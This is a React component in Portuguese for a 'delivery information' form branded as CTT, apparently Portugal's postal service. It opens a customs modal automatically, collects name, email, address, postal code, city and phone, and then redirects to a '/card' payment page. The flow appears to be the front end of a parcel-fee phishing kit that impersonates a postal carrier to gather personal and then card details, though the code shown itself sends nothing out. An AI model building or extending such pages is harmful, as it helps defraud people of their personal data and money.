import React, { useState } from 'react';
import { Card, CardContent } from './ui/card';
import { Input } from './ui/input';
import { Button } from './ui/button';
import { Label } from './ui/label';
import { AlertCircle, Package } from 'lucide-react';
import { useToast } from '../hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import CustomsModal from './CustomsModal';

const CTTBillingForm = () => {
  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    endereco: '',
    codigoPostal: '',
    cidade: '',
    telefone: ''
  });
  const [showModal, setShowModal] = useState(true);
  const { toast } = useToast();
  const navigate = useNavigate();

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = () => {
    // Validate required fields
    const requiredFields = ['nome', 'email', 'endereco', 'codigoPostal', 'cidade', 'telefone'];
    const missingFields = requiredFields.filter(field => !formData[field].trim());
    
    if (missingFields.length > 0) {
      toast({
        title: "Campos obrigatórios",
        description: "Por favor, preencha todos os campos obrigatórios",
        variant: "destructive"
      });
      return;
    }

    // Basic email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      toast({
        title: "Email inválido",
        description: "Por favor, introduza um endereço de email válido",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "Informações de entrega enviadas",
      description: "Redirecionando para a página de pagamento...",
      duration: 2000
    });

    // Navigate to card page after a short delay
    setTimeout(() => {
      navigate('/card');
    }, 2000);
  };

  return (
    <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
      <Card className="shadow-lg border-0 rounded-lg overflow-hidden">
        <CardContent className="p-8">
          {/* Form Header */}
          <div className="flex items-center mb-8">
            <AlertCircle className="w-5 h-5 text-red-600 mr-3" />
            <h2 className="text-xl font-semibold text-gray-900">
              Informações de entrega
            </h2>
          </div>

          {/* Form Fields */}
          <div className="space-y-6">
            {/* Nome */}
            <div className="space-y-2">
              <Label htmlFor="nome" className="text-sm font-medium text-gray-700">
                Nome <span className="text-red-500">*</span>
              </Label>
              <Input
                id="nome"
                type="text"
                placeholder="Nome"
                value={formData.nome}
                onChange={(e) => handleInputChange('nome', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
              />
            </div>

            {/* Correio electrónico */}
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                Correio electrónico <span className="text-red-500">*</span>
              </Label>
              <Input
                id="email"
                type="email"
                placeholder="Correio electrónico"
                value={formData.email}
                onChange={(e) => handleInputChange('email', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
              />
            </div>

            {/* Endereço */}
            <div className="space-y-2">
              <Label htmlFor="endereco" className="text-sm font-medium text-gray-700">
                Endereço <span className="text-red-500">*</span>
              </Label>
              <Input
                id="endereco"
                type="text"
                placeholder="Endereço"
                value={formData.endereco}
                onChange={(e) => handleInputChange('endereco', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
              />
            </div>

            {/* Código postal */}
            <div className="space-y-2">
              <Label htmlFor="codigoPostal" className="text-sm font-medium text-gray-700">
                Código postal <span className="text-red-500">*</span>
              </Label>
              <Input
                id="codigoPostal"
                type="text"
                placeholder="Código postal"
                value={formData.codigoPostal}
                onChange={(e) => handleInputChange('codigoPostal', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
              />
            </div>

            {/* Cidade */}
            <div className="space-y-2">
              <Label htmlFor="cidade" className="text-sm font-medium text-gray-700">
                Cidade <span className="text-red-500">*</span>
              </Label>
              <Input
                id="cidade"
                type="text"
                placeholder="Cidade"
                value={formData.cidade}
                onChange={(e) => handleInputChange('cidade', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
              />
            </div>

            {/* Número de telefone */}
            <div className="space-y-2">
              <Label htmlFor="telefone" className="text-sm font-medium text-gray-700">
                Número de telefone <span className="text-red-500">*</span>
              </Label>
              <Input
                id="telefone"
                type="tel"
                placeholder="Número de telefone"
                value={formData.telefone}
                onChange={(e) => handleInputChange('telefone', e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
                required
              />
            </div>
          </div>

          {/* Terms Notice */}
          <div className="mt-6 text-sm text-gray-600">
            Ao clicar no botão "Seguinte", está a aceitar as Condições Especiais de Envio Internacional.
          </div>

          {/* Submit Button */}
          <div className="mt-8 flex justify-end">
            <Button
              onClick={handleSubmit}
              className="bg-red-600 hover:bg-red-700 text-white px-8 py-2 rounded-md font-medium transition-colors duration-200"
            >
              Seguinte
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Custom Modal */}
      <CustomsModal 
        isOpen={showModal}
        onClose={() => setShowModal(false)}
      />
    </div>
  );
};

export default CTTBillingForm;